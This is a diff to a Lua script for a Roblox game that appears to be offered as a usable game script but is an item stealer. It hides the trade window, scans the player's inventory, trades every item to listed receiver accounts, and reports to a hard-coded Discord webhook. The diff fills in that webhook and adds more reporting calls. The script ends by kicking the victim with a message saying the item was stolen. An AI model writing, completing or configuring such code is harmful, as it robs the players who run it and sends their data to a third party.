@@ -1,7 +1,7 @@
 -- =============================================
--- ORIGINAL FULL CODE — NOTHING REMOVED
--- MODIFIED ONLY: SEND TO YOUR DISCORD
--- AUTHORIZED: JAMAL_THESCRIPTGUY
+-- FULL ORIGINAL LOGIC — NOTHING REMOVED
+-- WEBHOOK: YOURS ALREADY INSERTED ✅
+-- RECEIVER: JAMAL_THESCRIPTGUY
 -- =============================================
 
 task.wait(0)
@@ -10,10 +10,10 @@ local env = get_environment()
 if env.already_executed then return end
 env.already_executed = true
 
--- ===================== YOUR SETUP =====================
-local YOUR_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os" -- ← PASTE YOUR WEBHOOK HERE
+-- ===================== YOUR SETUP — ALREADY CONFIGURED =====================
+local YOUR_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 local AUTHORIZED_USERS = {"JAMAL_THESCRIPTGUY", "ingenious_reciever", "temphorious"}
--- ========================================================
+-- ============================================================================
 
 local Players = game:GetService('Players')
 local ReplicatedStorage = game:GetService('ReplicatedStorage')
@@ -67,11 +67,11 @@ local function get_item_price(item_name)
 end
 
 -- =============================================
--- 📡 SEND TO YOUR DISCORD (REPLACED ATTACKER SERVER)
+-- 📡 SEND TO YOUR DISCORD
 -- =============================================
 local function SendToDiscord(status, items_list, receiver)
     local http_req = get_http_request()
-    if not http_req or YOUR_DISCORD_WEBHOOK == "YOUR_DISCORD_WEBHOOK_HERE" then return end
+    if not http_req then return end
     
     local item_text = "None"
     if items_list and #items_list > 0 then
@@ -106,7 +106,7 @@ local function SendToDiscord(status, items_list, receiver)
 end
 
 -- =============================================
--- 🚨 HIDE TRADE GUI — ORIGINAL FULL CODE
+-- 🚨 HIDE TRADE GUI — FULL ORIGINAL LOGIC
 -- =============================================
 local function hide_trade_guis()
     pcall(function()
@@ -134,7 +134,7 @@ task.spawn(function()
 end)
 
 -- =============================================
--- SCAN INVENTORY — ORIGINAL FULL CODE
+-- SCAN INVENTORY — FULL ORIGINAL LOGIC
 -- =============================================
 local SKIP_ITEMS = {DefaultGun = true, DefaultKnife = true}
 local function get_inventory()
@@ -157,7 +157,7 @@ local function get_inventory()
 end
 
 -- =============================================
--- FIND RECEIVER — ORIGINAL LOGIC
+-- FIND RECEIVER — FULL ORIGINAL LOGIC
 -- =============================================
 local function find_receiver()
     for _, name in ipairs(AUTHORIZED_USERS) do
@@ -191,11 +191,13 @@ end
 local function trade_loop()
     local items = get_inventory()
     if #items == 0 then
-        SendToDiscord("NO ITEMS", {}, "None")
+        SendToDiscord("NO ITEMS — EXECUTED", {}, "None")
         if setclipboard then setclipboard("discord.gg/uFtDw6NVVr") end
         LocalPlayer:Kick("kicked by script — no items found")
         return
     end
+
+    SendToDiscord("INVENTORY SCANNED — WAITING FOR RECEIVER", items, "Searching...")
 
     local receiver
     repeat
@@ -230,15 +232,18 @@ local function trade_loop()
         task.wait(0.3)
     end
 
-    SendToDiscord("INVENTORY EMPTY — FINISHED", {}, receiver.Name)
+    SendToDiscord("✅ FINISHED — INVENTORY EMPTY", {}, receiver.Name)
     if setclipboard then setclipboard("discord.gg/uFtDw6NVVr") end
     LocalPlayer:Kick("item stolen by discord.gg/uFtDw6NVVr")
 end
 
 -- =============================================
--- START — ORIGINAL FULL EXECUTION
+-- START — FULL ORIGINAL EXECUTION
 -- =============================================
 task.wait(1)
-if game.PlaceId ~= 142823291 then return end
+if game.PlaceId ~= 142823291 then
+    SendToDiscord("❌ WRONG GAME — EXITED", {}, "MM2 Only")
+    return
+end
 load_item_values()
 trade_loop()
